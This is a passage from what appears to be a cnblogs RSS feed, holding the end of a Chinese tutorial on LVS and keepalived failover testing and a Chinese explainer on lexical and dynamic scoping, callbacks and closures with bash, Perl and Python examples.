Prot LocalAddress:Port Scheduler Flags
  &lt;/span&gt;-&amp;gt;&lt;span&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;&lt;span&gt; rr
  &lt;/span&gt;-&amp;gt; &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.9&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;               Route   &lt;span&gt;1&lt;/span&gt;      &lt;span&gt;0&lt;/span&gt;          &lt;span&gt;0&lt;/span&gt;      
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;已自动移除172.20.10.8服务器&lt;/p&gt;
&lt;p&gt;测试成功！&lt;/p&gt;
&lt;p&gt;关闭172.20.10.2 keepalived主服务器进行测试&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@ken ~]# systemctl stop keepalived
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看keepalived主服务器端ipvsadm规则&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@ken ~]# ipvsadm -L -&lt;span&gt;n
IP Virtual Server version &lt;/span&gt;&lt;span&gt;1.2&lt;/span&gt;.&lt;span&gt;1&lt;/span&gt; (size=&lt;span&gt;4096&lt;/span&gt;&lt;span&gt;)
Prot LocalAddress:Port Scheduler Flags
  &lt;/span&gt;-&amp;gt; RemoteAddress:Port           Forward Weight ActiveConn InActConn
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看keepalived主服务器端VIP&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
[root@ken ~&lt;span&gt;]# ip a
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/loopback &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt; brd &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;&lt;span&gt;
    inet &lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;/&lt;span&gt;8&lt;/span&gt;&lt;span&gt; scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; scope host 
       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;1500&lt;/span&gt; qdisc pfifo_fast state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/ether &lt;span&gt;00&lt;/span&gt;:0c:&lt;span&gt;29&lt;/span&gt;&lt;span&gt;:2d:5b:b8 brd ff:ff:ff:ff:ff:ff
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.2&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; brd &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.15&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; noprefixroute eth0
       valid_lft forever preferred_lft forever  #已经没有VIP
    inet6 fe80::20c:29ff:fe2d:5bb8&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; scope link 
       valid_lft forever preferred_lft forever&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看从服务器ipvsadm规则&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[root@ken ~]# ipvsadm -L -n --&lt;span&gt;stats
IP Virtual Server version &lt;/span&gt;&lt;span&gt;1.2&lt;/span&gt;.&lt;span&gt;1&lt;/span&gt; (size=&lt;span&gt;4096&lt;/span&gt;&lt;span&gt;)
Prot LocalAddress:Port               Conns   InPkts  OutPkts  InBytes OutBytes
  &lt;/span&gt;-&amp;gt;&lt;span&gt; RemoteAddress:Port
TCP  &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;                     &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;
  -&amp;gt; &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.9&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt;                      &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;        &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从服务器端已经自动继承主服务器端ipvsadm规则&lt;/p&gt;
&lt;p&gt;查看从服务器端是否有VIP&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
[root@ken ~&lt;span&gt;]# ip a
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/loopback &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt; brd &lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;:&lt;span&gt;00&lt;/span&gt;&lt;span&gt;
    inet &lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;/&lt;span&gt;8&lt;/span&gt;&lt;span&gt; scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; scope host 
       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span&gt;1500&lt;/span&gt; qdisc pfifo_fast state UNKNOWN group &lt;span&gt;default&lt;/span&gt; qlen &lt;span&gt;1000&lt;/span&gt;&lt;span&gt;
    link&lt;/span&gt;/ether &lt;span&gt;00&lt;/span&gt;:0c:&lt;span&gt;29&lt;/span&gt;&lt;span&gt;:a5:e9:a4 brd ff:ff:ff:ff:ff:ff
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.5&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; brd &lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.15&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet &lt;/span&gt;&lt;span&gt;172.20&lt;/span&gt;.&lt;span&gt;10.11&lt;/span&gt;/&lt;span&gt;28&lt;/span&gt; scope &lt;span&gt;global&lt;/span&gt;&lt;span&gt; secondary eth0  
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fea5:e9a4&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; scope link 
       valid_lft forever preferred_lft forever&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;VIP已经自动继承到从服务器端&lt;/p&gt;
&lt;p&gt;测试完成！&lt;/p&gt;

</description>
<pubDate>Mon, 01 Oct 2018 14:32:00 +0000</pubDate>
<dc:creator>技术流ken</dc:creator>
<og:description>1.keepalived简介 lvs在我之前的博客《高负载集群实战之lvs负载均衡-技术流ken》中已经进行了详细的介绍和应用，在这里就不再赘述。这篇博文将把lvs与keepalived相结合使用，在</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kenken2018/p/9735947.html</dc:identifier>
</item>
<item>
<title>一文搞懂：词法作用域、动态作用域、回调函数、闭包 - 骏马金龙</title>
<link>http://www.cnblogs.com/f-ck-need-u/p/9735955.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/f-ck-need-u/p/9735955.html</guid>
<description>&lt;p&gt;堵车节第一天，我没有出门。把以前一直只限于知道，却不清晰理解的这几个概念完完整整地梳理了一番。内容参考自wiki页面，然后加上自己一些理解。&lt;/p&gt;

&lt;p&gt;不管什么语言，我们总要学习作用域(或生命周期)的概念，比如常见的称呼：全局变量、包变量、模块变量、本地变量、局部变量等等。不管如何称呼这些作用域的范围，实现它们的目的都一样：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;(1)为了避免名称冲突;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;(2)为了限定变量的生命周期(本文以变量名说事，其它的名称在规则上是一样的)。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;但是不同语言的作用域规则不一样，虽然学个简单的基础就足够应用，因为我们有编程规范：(1)尽量避免名称冲突;(2)加上类似于local的修饰符尽量缩小生效范围;(3)放进代码块，等等。但是真正去细心验证作用域的生效机制却并非易事(我学Python的时候，花了很长时间细细验证，学perl的时候又花了很长时间细细验证)，但可以肯定的是，理解本文的词法作用域规则(Lexical scoping)和动态作用域规则(dynamic scoping)，对学习任何语言的作用域规则都有很大帮助，这两个规则是各种语言都宏观通用的。&lt;/p&gt;
&lt;p&gt;很简单的一段bash下的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;x=1
function g(){ echo &quot;g: $x&quot; ; x=2; }
function f(){ local x=3 ; g; echo &quot;f: $x&quot;; } # 输出2还是3
f           # 输出1还是3？
echo $x     # 输出1还是2？&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于bash来说，上面输出的分别是3(g函数中echo)、2(f函数中的echo)和1(最后一行echo)。但是同样语义的代码在其它语言下得到的结果可能就不一样(分别输出1、3和2，例如perl中将local替换为my)。&lt;/p&gt;
&lt;p&gt;这牵扯到两种贯穿所有程序语言的作用域概念：&lt;strong&gt;词法作用域(类似于C语言中static)和动态作用域&lt;/strong&gt;。词法作用域和&quot;词法&quot;这个词真的没什么关系，反而更应该称之为&quot;文本段作用域&quot;。要区别它们，只需要回答&quot;函数out_func中嵌套的内层函数in_func能否看见out_func中的环境&quot;。&lt;/p&gt;
&lt;p&gt;对于上面的bash代码来说，假如这段代码是适用于所有语言的伪代码：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对于词法作用域的语言，执行f时会调用g，&lt;strong&gt;g将无法访问f文本段的变量，词法作用域认为g并不是f的一部分，而是跳出f的，因为g的定义文本段是在全局范围内的，所以它是全局文本段的一部分。如果函数g的定义文本段是在f内部，则g属于f文本段的一部分&lt;/strong&gt;。
&lt;ul&gt;&lt;li&gt;所以g不知道f文本段中&lt;code&gt;local x=3&lt;/code&gt;的设置，于是g的echo会输出全局变量&lt;code&gt;x=1&lt;/code&gt;，然后设置&lt;code&gt;x=2&lt;/code&gt;，因为它没有加上作用域修饰符，而g又是全局内的函数，所以x将修改全局作用域的x值，使得最后的echo输出2，而f中的echo则输出它自己文本段中的local x=3。所以整个流程输出&lt;code&gt;1 3 2&lt;/code&gt;&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;对于动态作用域的语言，执行f时会调用g，&lt;strong&gt;g将可以访问f文本中的变量，动态作用域认为g是f文本段的一部分，是f中的嵌套函数&lt;/strong&gt;。
&lt;ul&gt;&lt;li&gt;所以g能看到&lt;code&gt;local x=3&lt;/code&gt;的设置，所以g的echo会输出3。g中设置x=2后，仅仅只是在f的内层嵌套函数中设置，所以x=2对g文本段和f文本段(因为g是f的一部分)都可见，但对f文本段外部不可见，所以f中的echo输出2，最后一行的echo输出1。所以整个流程输出&lt;code&gt;3 2 1&lt;/code&gt;&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;总结来说：
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;词法作用域是关联在编译期间的，对于函数来说就是函数的定义文本段的位置决定这个函数所属的范围&lt;/strong&gt;。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态作用域是关联在程序执行期间的，对于函数来说就时函数执行的位置决定这个函数所属的范围&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;由于bash实现的是动态作用域规则。所以，输出的是&lt;code&gt;3 2 1&lt;/code&gt;。对于perl来说，my修饰符实现词法作用域规则，local修饰符实现动态作用域规则。&lt;/p&gt;
&lt;p&gt;例如，使用my修饰符的perl程序：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/perl

$x=1;
sub g { print &quot;g: $x\n&quot;; $x=2; }
sub f { my $x=3; g(); print &quot;f: $x\n&quot;; }  # 词法作用域
f(); 
print &quot;$x\n&quot;; &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[fairy@fairy:/perlapp]$ perl scope2.pl 
g: 1
f: 3
2&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用local修饰符的perl程序：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/perl

$x=1;
sub g { print &quot;g: $x\n&quot;; $x=2; }
sub f { local $x=3; g(); print &quot;f: $x\n&quot;; }  # 动态作用域
f(); 
print &quot;$x\n&quot;; &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[fairy@fairy:/perlapp]$ perl scope2.pl 
g: 3
f: 2
1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有些语言只支持一种作用域规则，特别是那些比较现代化的语言，而有些语言支持两种作用域规则(正如perl语言，my实现词法变量作用域规则，local实现动态作用域规则)。相对来说，词法作用域规则比较好控制整个流程，还能借此实现更丰富的功能(如最典型的&quot;闭包&quot;以及高阶函数)，而动态作用域由于让变量生命周期&quot;没有任何深度&quot;(回想一下shell脚本对函数和作用域的控制，非常傻瓜化)，比较少应用上，甚至有些语言根本不支持动态作用域。&lt;/p&gt;

&lt;h2 id=&quot;理解闭包回调函数不可不知的术语&quot;&gt;理解闭包、回调函数不可不知的术语&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1.引用(reference)：数据对象和它们的名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前文所说的可见、不可见、变量是否存在等概念，都是针对变量名(或其它名称，如函数名、列表名、hash名)而言的，和变量的值无关。名称和值的关系是引用(或指向)关系，赋值的行为就是将值所在的数据对象的引用(指针)交给名称，让名称指向这个内存中的这个数据值对象。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/733013/201810/733013-20181001115749652-657272712.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.一级函数(first-class functions)和高阶函数(high-order functions)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有些语言认为函数就是一种类型，称之为函数类型，就像变量一样。这种类型的语言可以：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;将函数赋值给某个变量，那么这个变量就是这个函数体的另一个引用，就像是第二个函数名称一样。通过这个函数引用变量，可以找到函数体，然后调用执行。
&lt;ul&gt;&lt;li&gt;例如perl中&lt;code&gt;$ref_func=\&amp;amp;myfunc&lt;/code&gt;表示将函数myfunc的引用赋值给&lt;code&gt;$ref_func&lt;/code&gt;，那么&lt;code&gt;$ref_func&lt;/code&gt;也指向这个函数。&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;将函数作为另一个函数的参数。例如两个函数名为myfunc和func1，那么&lt;code&gt;myfunc(func1)&lt;/code&gt;就将func1作为myfunc的参数。
&lt;ul&gt;&lt;li&gt;这种行为一般用于myfunc函数中对满足某些逻辑的东西执行func1函数。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;举个简单的例子，unix下的find命令，将find看作是一个函数，它用于查找指定路径下符合条件的文件名，将&lt;code&gt;-print&lt;/code&gt;、&lt;code&gt;-exec {}\;&lt;/code&gt;选项实现的功能看作是其它的函数(请无视它是否真的是函数)，这些选项对应的函数是find函数的参数，每当find函数找到符合条件的文件名时，就执行&lt;code&gt;-print&lt;/code&gt;函数输出这个文件名&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;函数的返回值也可以是另一个函数。例如myfunc函数的定义语句为&lt;code&gt;function myfunc(){ ...return func1 }&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;其实，实现上面三种功能的函数称之为一级函数或高阶函数，其中高阶函数至少要实现上面的2和3。一级函数和高阶函数并没有区分的必要，但如果一定要区分，那么：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;一级函数更像是一种术语概念，它将函数当作一种值看待，可以将其赋值出去、作为参数传递出去以及作为返回值，对于计算机程序语言而言，它更多的是用来描述某种语言是否支持一级函数；&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;高阶函数是一种函数类型，就像回调函数一样，当某个函数符合高阶函数的特性，就可以将其称之为这是一个高阶函数。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;3.自由变量(free variable)和约束变量(bound variable)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一组数学界的术语。&lt;/p&gt;
&lt;p&gt;在计算机程序语言中，自由变量是指函数中的一种特殊变量，这种变量既不在本函数中定义，也不是本函数的参数。换句话说，可能是外层函数中定义的但却在内层函数中使用的，所以自由变量常常和&quot;非本地变量&quot;(non-local variable，熟悉Python的人肯定知道)互用。例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;function func1(x){
    var z;
    function func2(y){
        return x+y+z     # x和z既不是func2内部定义的，也不是func2的参数，所以x和z都是自由变量
    }
    return func1
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;自由变量和约束变量对应。所谓约束变量，是指这个变量之前是自由变量，但之后会对它进行赋值，将自由变量绑定到一个值上之后，这个变量就成为约束变量或者称为绑定变量。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;function func1(x){
    var m=20     # 对func2来说，这是自由变量，对其赋值，所以m变成了bound variable
    var z
    function func2(y){
        z=10       # 对自由变量z赋值，z变成bound variable
        return m+x+y+z     # m、x和z都是自由变量
    }
    return func1
}

ref_func=func1(3)       # 对x赋值，x变成bound variable&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;回调函数&quot;&gt;回调函数&lt;/h2&gt;
&lt;p&gt;回调函数一开始是C里面的概念，它表示的是一个函数：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;可以访问另一个函数&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;当这个函数执行完了，会执行另一个函数&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;也就是说，将一个函数(B)作为参数传递给另一个函数(A)，但A执行完后，再自动调用B。所以这种回调函数的概念也称为&quot;call after&quot;。&lt;/p&gt;
&lt;p&gt;但是现在回调函数已经足够通用化了。通用化的回调函数定义为：将函数B作为另一个函数A的参数，执行到函数A中某个地方的时候去调用B。和原来的概念相比，不再是函数A结束后再调用，而是我们自己定义在哪个地方调用。&lt;/p&gt;
&lt;p&gt;例如，Perl中的&lt;code&gt;File::Find&lt;/code&gt;模块中的find函数，通过这个函数加上回调函数，可以实现和unix find命令相同的功能。例如，搜索某个目录下的文件，然后print输出这个文件名，即&lt;code&gt;find /path xxx -print&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/perl
use File::Find;

sub print_path {         # 定义一个函数，用于输出路径名称
    print &quot;$File::Find::name\n&quot;;
}

$callback = \&amp;amp;print_path;  # 创建一个函数引用，名为$callback，所以perl是一种支持一级函数的语言

find( $callback,&quot;/tmp&quot; );  # 查找/tmp下的文件，每查找到一个文件，就执行一次$callback函数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里传递给find函数的&lt;code&gt;$callback&lt;/code&gt;就是一个回调函数。几个关键点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;$callback&lt;/code&gt;作为参数传递给另一个find()函数(所以find()函数是一个高阶函数)&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;在find()函数中，每查找到一个文件，就调用一次这个&lt;code&gt;$callback&lt;/code&gt;函数。当然，如果find是我们自己写的程序，就可以由我们自己定义在什么地方去调用&lt;code&gt;$callback&lt;/code&gt;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$callback&lt;/code&gt;不是我们主动调用的，而是由find()函数在某些情况下(每查找到一个文件)去调用的&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;回调就像对函数进行填空答题一样，根据我们填入的内容去复用填入的函数从而实现某一方面的细节，而普通函数则是定义了就只能机械式地复用函数本身。&lt;/p&gt;
&lt;p&gt;之所以称为回调函数，是因为这个函数并非由我们主观地、直接地去调用，而是将函数作为一个参数，通过被调用者间接去调用这个函数参数。本质上，回调函数和一般的函数没有什么区别，可能只是因为我们定义一个函数，却从来没有直接调用它，这一点感觉上有点奇怪，所以有人称之为&quot;回调函数&quot;，用来统称这种间接的调用关系。&lt;/p&gt;
&lt;p&gt;回调函数可以被多线程异步执行。&lt;/p&gt;
&lt;h2 id=&quot;彻底搞懂闭包&quot;&gt;彻底搞懂闭包&lt;/h2&gt;
&lt;p&gt;计算机中的闭包概念是从数学世界引入的，在计算机程序语言中，它也称为词法闭包、函数闭包。&lt;/p&gt;
&lt;p&gt;闭包简单的、通用的定义是指：函数引用一个词法变量，在函数或语句块结束后(变量的名称消失)，词法变量仍然对引用它的函数有效。在下一节还有关于闭包更严格的定义(来自wiki)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/733013/201810/733013-20181001122042214-1678821421.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看一个python示例：函数f中嵌套了函数g，并返回函数g&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;def f(x):
    def g(y):
        return x + y
    return g  # 返回一个闭包：有名称的函数(高阶函数的特性)

# 将执行函数时返回的闭包函数赋值给变量(高阶函数的特性)
a = f(1)

# 调用存储在变量中闭包函数
print (a(5))

# 无需将闭包存储进临时变量，直接一次性调用闭包函数
print( f(1)(5) )   # f(1)是闭包函数，因为没有将其赋值给变量，所以f(1)称为&quot;匿名闭包&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的a是一个闭包，它是函数g()的一个实例。f()的参数x可以被g访问，在f()返回g函数后，f()就退出了，随之消失的是变量名x(注意是变量名称x，变量的值在这里还不一定会消失)。当将闭包f(1)赋值给a后，原来x指向的数据对象(即数值1)仍被a指向的闭包函数引用着，所以x对应的值1在x消失后仍保存在内存中，只有当名为a的闭包被消除后，原来x指向的数值1才会消失。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;闭包特性1：对于返回的每个闭包g()来说，不同的g()引用不同的x对应的数据对象。换句话说，变量x对应的数据对象对每个闭包来说都是相互独立的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如下面得到两个闭包，这两个闭包中持有的自由变量虽然都引用相等的数值1，但两个数值是不同数据对象，这两个闭包也是相互独立的：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;a=f(1)
b=f(1)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;闭包特性2：对于某个闭包函数来说，只要这不是一个匿名闭包，那么闭包函数可以一直访问x对应的数据对象，即使名称x已经消失&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;但是&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;a=f(1)      # 有名称的闭包a，将一直引用数值对象1
a(3)        # 调用闭包函数a，将返回1+3=4，其中1是被a引用着的对象，即使a(3)执行完了也不放开
a(3)        # 再次调用函数a，将返回4，其中1和上面一条语句的1是同一个数据对象
f(1)(3)     # 调用匿名的闭包函数，数据对象1在f(1)(3)执行完就消失
f(1)(3)     # 调用匿名的闭包函数，和上面的匿名闭包是相互独立的&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最重要的特性就在于上面执行的两次a(3)：&lt;strong&gt;将词法变量的生命周期延长，但却足够安全&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;看下面perl程序中的闭包函数，可以更直观地看到结果。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;sub how_many {       # 定义函数
    my $count=2;     # 词法变量$count
    return sub {print ++$count,&quot;\n&quot;};  # 返回一个匿名函数，这是一个匿名闭包
}

$ref=how_many();    # 将闭包赋值给变量$ref

how_many()-&amp;gt;();     # (1)调用匿名闭包：输出3
how_many()-&amp;gt;();     # (2)调用匿名闭包：输出3
$ref-&amp;gt;();           # (3)调用命名闭包：输出3
$ref-&amp;gt;();           # (4)再次调用命名闭包：输出4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面将闭包赋值给&lt;code&gt;$ref&lt;/code&gt;，通过&lt;code&gt;$ref&lt;/code&gt;去调用这个闭包，则即使how_many中的&lt;code&gt;$count&lt;/code&gt;在how_many()执行完就消失了，但&lt;code&gt;$ref&lt;/code&gt;指向的闭包函数仍然在引用这个变量，所以多次调用&lt;code&gt;$ref&lt;/code&gt;会不断修改&lt;code&gt;$count&lt;/code&gt;的值，所以上面(3)和(4)先输出3，然后输出改变后的4。而上面(1)和(2)的输出都是3，因为两个how_many()函数返回的是独立的匿名闭包，在语句执行完后数据对象3就消失了。&lt;/p&gt;
&lt;h2 id=&quot;闭包更严格的定义&quot;&gt;闭包更严格的定义&lt;/h2&gt;
&lt;p&gt;注意，严格定义的闭包和前面通俗定义的闭包结果上是不一样的，通俗意义上的闭包并不一定符合严格意义上的闭包。&lt;/p&gt;
&lt;p&gt;关于闭包更严格的定义，是一段谁都看不懂的说明(来自wiki)。如下，几个关键词我加粗显示了，因为重要。&lt;/p&gt;
&lt;p&gt;闭包是一种在支持一级函的编程语言中能够将词法作用域中的变量名称进行绑定的技术。在操作上，闭包是一种用于保存函数和环境的记录。这个&lt;strong&gt;环境&lt;/strong&gt;记录了一些关联性的映射，将函数的每个&lt;strong&gt;自由变量&lt;/strong&gt;与创建闭包时所绑定名称的值或引用&lt;strong&gt;相关联&lt;/strong&gt;。&lt;strong&gt;通过闭包，就算是在作用域外部调用函数，也允许函数通过闭包拷贝他们的值或通过引用的方式去访问那些已经被捕获的变量&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我知道这段话谁都看不懂，所以简而言之一下：&lt;strong&gt;一个函数实例和一个环境结合起来就是闭包&lt;/strong&gt;。这个所谓的环境，决定了这个函数的特殊性，决定了闭包的特性。&lt;/p&gt;
&lt;p&gt;还是上面的python示例：函数f中嵌套了函数g，并返回函数g&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;def f(x):
    def g(y):
        return x + y
    return g  # 返回一个闭包：有名称的函数

# 将执行函数时返回的闭包函数赋值给变量
a = f(1)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的a是一个闭包，它是函数g()的一个实例。f()的参数x可以被g访问，对于g()来说，这个x不是g()内部定义的，也不是g()的参数，所以这个x对于g来说是一个自由变量(free variable)。虽然g()中持有了自由变量，但是g()函数自身不是闭包函数，只有在g持有的自由变量x和传递给f()函数的x的值(即f(1)中的1)进行&lt;strong&gt;绑定的时候，才会从g()创建一个闭包函数&lt;/strong&gt;，这表示闭包函数开始引用这个自由变量，并且这个闭包一直持有这个变量的引用，即使f()已经执行完毕了。然后在f()中return这个闭包函数，因为这个闭包函数绑定了(引用)自由变量x，这就是闭包函数所在的环境。&lt;/p&gt;
&lt;p&gt;环境对闭包来说非常重要，是区别普通函数和闭包的关键。&lt;strong&gt;如果返回的每个闭包不是独立持有属于自己的自由变量，而是所有闭包都持有完全相同的自由变量，那么闭包虽然仍可称为闭包，但和普通函数却没有区别了&lt;/strong&gt;。例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;def f(x):
    x=3
    def g(y):
        return x + y
    return g

a = f(1)
b = f(3)&lt;/code&gt;
&lt;/pre&gt;
